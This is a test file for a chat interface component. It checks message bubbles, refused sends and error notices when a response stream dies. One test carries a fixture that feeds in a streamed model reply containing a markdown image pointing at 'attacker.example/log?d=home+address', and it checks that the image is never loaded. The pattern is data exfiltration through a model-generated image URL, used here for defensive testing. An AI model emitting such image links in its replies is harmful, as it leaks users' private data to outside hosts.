import { LocalLlmGenerationError } from '@ci/common';
import { fireEvent, screen, waitFor } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

import { renderWithProviders } from '@/test/renderWithProviders';

import { Chat } from './Chat';
import { Channel, FrameEncoder } from './utils';

vi.mock('@/components/ModelSelector', () => ({
  ModelSelector: () => <div data-testid="model-selector" />,
  ToolsOffNotice: () => <div data-testid="tools-off-notice" />,
}));

vi.mock('@/api/useUploadFile', () => ({
  useUploadFile: () => [
    { files: [], loading: false, error: null },
    { upload: vi.fn(), reset: vi.fn() },
  ],
}));

describe('Chat', () => {
  it('shows the empty state when there are no messages', () => {
    const { getByText } = renderWithProviders(<Chat emptyState={<div>Start the conversation</div>} />);

    expect(getByText('Start the conversation')).toBeInTheDocument();
  });

  it('renders provided messages and hides the empty state', () => {
    const { getByText, queryByText } = renderWithProviders(
      <Chat
        emptyState={<div>Start the conversation</div>}
        messages={[
          { role: 'user', content: 'hi there' },
          { role: 'assistant', content: 'hello back' },
        ]}
      />,
    );

    expect(getByText('hi there')).toBeInTheDocument();
    expect(getByText('hello back')).toBeInTheDocument();
    expect(queryByText('Start the conversation')).not.toBeInTheDocument();
  });

  it('shows the user bubble immediately, even if onSubmit has not resolved', async () => {
    const onSubmit = vi.fn(() => new Promise<boolean>(() => undefined));
    const { getByText, getByRole } = renderWithProviders(<Chat onSubmit={onSubmit} />);

    const textarea = getByRole('textbox');
    fireEvent.change(textarea, { target: { value: 'what is up' } });
    fireEvent.keyDown(textarea, { key: 'Enter' });

    await waitFor(() => expect(getByText('what is up')).toBeInTheDocument());
  });

  /**
   * A refused send leaves its text in the composer (ChatInput only clears on `true`), so the transcript must not
   * also claim it was sent: each refused try added a user bubble with no reply, two tries gave two bubbles.
   */
  describe('a refused send', () => {
    // The composer's own text node would match too — React mirrors a textarea's value into its default value.
    const bubbles = (text: string) => screen.queryAllByText(text, { ignore: 'textarea, script, style' });

    const typeAndSend = (text: string) => {
      const textbox = screen.getByRole('textbox');

      fireEvent.change(textbox, { target: { value: text } });
      fireEvent.keyDown(textbox, { key: 'Enter' });
    };

    it('shows the bubble while the send is still pending', async () => {
      renderWithProviders(<Chat onSubmit={() => new Promise<boolean>(() => undefined)} />);

      typeAndSend('what is up');

      await waitFor(() => expect(bubbles('what is up')).toHaveLength(1));
    });

    it('takes its user bubble back, and the empty state returns with it', async () => {
      const onSubmit = vi.fn().mockResolvedValue(false);

      renderWithProviders(<Chat onSubmit={onSubmit} emptyState={<div>Start the conversation</div>} />);
      typeAndSend('what is up');

      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(1));
      await waitFor(() => expect(bubbles('what is up')).toHaveLength(0));
      expect(screen.getByText('Start the conversation')).toBeInTheDocument();
      // Still in the box, so it can be fixed and sent again.
      expect(screen.getByRole('textbox')).toHaveValue('what is up');
    });

    it('leaves no bubble however many times it is tried', async () => {
      const onSubmit = vi.fn().mockResolvedValue(false);

      renderWithProviders(<Chat onSubmit={onSubmit} />);

      typeAndSend('try again');
      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(1));
      await waitFor(() => expect(bubbles('try again')).toHaveLength(0));

      typeAndSend('try again!');
      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(2));
      await waitFor(() => expect(bubbles('try again!')).toHaveLength(0));
    });

    it('shows exactly one bubble once the retry is accepted', async () => {
      const onSubmit = vi.fn().mockResolvedValueOnce(false).mockResolvedValue(true);

      renderWithProviders(<Chat onSubmit={onSubmit} />);

      typeAndSend('hello');
      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(1));
      await waitFor(() => expect(bubbles('hello')).toHaveLength(0));

      typeAndSend('hello!');
      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(2));
      await waitFor(() => expect(bubbles('hello!')).toHaveLength(1));
      expect(bubbles('hello')).toHaveLength(0);
    });

    it('keeps the bubble of an accepted send', async () => {
      const onSubmit = vi.fn().mockResolvedValue(true);

      renderWithProviders(<Chat onSubmit={onSubmit} />);
      typeAndSend('what is up');

      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(1));
      await new Promise((resolve) => setTimeout(resolve, 20));
      expect(bubbles('what is up')).toHaveLength(1);
    });
  });

  it('never loads a remote image while a reply streams in', async () => {
    // The live reply is painted by the streaming renderer, not by Markdown, so
    // Markdown's own image rule never saw it. The URL arrives split across
    // frames, the way a model's tokens do.
    const src = 'https://attacker.example/log?d=home+address';
    const reply = `Here you go. ![](${src})`;
    const encoder = new FrameEncoder();
    const readable = new ReadableStream<Uint8Array>({
      start(controller) {
        for (const piece of [reply.slice(0, 20), reply.slice(20, 40), reply.slice(40)]) {
          controller.enqueue(encoder.encodeFrame(Channel.TEXT, piece));
        }

        controller.close();
      },
    });

    const { container } = renderWithProviders(
      <Chat messages={[{ role: 'user', content: 'where do I live?' }]} readable={readable} />,
    );

    await waitFor(() => expect(container.querySelector('a[data-remote-image]')).toHaveAttribute('href', src));
    expect(container.querySelector('img')).toBeNull();
  });

  /**
   * A turn whose stream dies — the on-device model failing right after a tool call was the case that motivated this.
   * The notice always says the reply is incomplete; it adds the reason only when the failure carries one.
   */
  describe('a reply whose stream dies', () => {
    const dying = (error: unknown) =>
      new ReadableStream<Uint8Array>({
        start(controller) {
          controller.error(error);
        },
      });

    const renderDying = (error: unknown) => {
      // Chat logs the failure for whoever has the console open; the log is not what is under test.
      vi.spyOn(console, 'error').mockImplementation(() => undefined);

      return renderWithProviders(
        <Chat messages={[{ role: 'user', content: 'search my memory' }]} readable={dying(error)} />,
      );
    };

    it('keeps the generic wording, and adds nothing, for a failure with no reason of its own', async () => {
      renderDying(new Error('socket hang up'));

      expect(await screen.findByText(/The response stream was interrupted/)).toBeInTheDocument();
      expect(screen.queryByText(/Reason:/)).not.toBeInTheDocument();
      // An arbitrary error's text is not the user's business: only a native model failure is explained.
      expect(screen.queryByText(/socket hang up/)).not.toBeInTheDocument();
    });

    it('says why an on-device turn failed, under the generic wording', async () => {
      renderDying(
        new LocalLlmGenerationError(
          'Generation failed: Invalid response from native layer: Input token ids are too long.',
        ),
      );

      expect(await screen.findByText(/The response stream was interrupted/)).toBeInTheDocument();
      expect(
        screen.getByText('Reason: Invalid response from native layer: Input token ids are too long.'),
      ).toBeInTheDocument();
    });

    it('keeps the generic wording alone when the on-device failure had no reason to give', async () => {
      renderDying(new LocalLlmGenerationError('Generation failed'));

      expect(await screen.findByText(/The response stream was interrupted/)).toBeInTheDocument();
      expect(screen.queryByText(/Reason:/)).not.toBeInTheDocument();
    });
  });

  it('submits a typed message through ChatInput', async () => {
    const onSubmit = vi.fn().mockReturnValue(true);
    const { getByRole } = renderWithProviders(<Chat onSubmit={onSubmit} />);

    const textarea = getByRole('textbox');
    fireEvent.change(textarea, { target: { value: 'what is up' } });
    fireEvent.keyDown(textarea, { key: 'Enter' });

    await waitFor(() =>
      expect(onSubmit).toHaveBeenCalledWith(
        expect.objectContaining({ message: 'what is up' }),
        expect.anything(),
      ),
    );
  });
});
